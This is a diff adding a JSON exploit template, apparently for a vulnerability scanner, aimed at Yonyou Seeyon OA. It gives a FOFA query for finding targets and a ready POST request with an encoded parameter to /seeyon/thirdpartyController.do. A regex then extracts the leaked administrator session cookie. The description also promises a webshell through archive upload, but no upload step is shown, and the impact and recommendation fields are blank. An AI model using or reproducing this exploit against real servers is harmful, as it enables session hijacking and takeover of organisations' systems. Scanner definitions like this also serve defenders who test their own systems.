@@ -1,0 +1,98 @@
+{
+  "Name": "Seeyon OA administrator cookie leakage file upload",
+  "Description": "Get the administrator cookie directly by request, By uploading a compressed file, calling the interface to perform the file decompression, the exploit of the decompression process will be exploited to obtain the webshell.",
+  "Product": "Yonyou-Seeyon-OA",
+  "Homepage": "https://www.seeyon.com/",
+  "DisclosureDate": "2021-04-10",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Yonyou-Seeyon-OA\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "Name": "cmd",
+      "Type": "input",
+      "Value": "whoami"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1",
+        "data_type": "text",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "method": "POST",
+        "uri": "/seeyon/thirdpartyController.do"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Set-Cookie",
+            "variable": "$head"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "JSESSIONID",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1",
+        "data_type": "text",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "method": "POST",
+        "uri": "/seeyon/thirdpartyController.do"
+      },
+      "SetVariable": [
+        "output|lastheader|regex|Set-Cookie: (.*?); Path="
+      ]
+    }
+  ],
+  "Tags": ["getshell"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Yonyou-Seeyon-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": false
+}
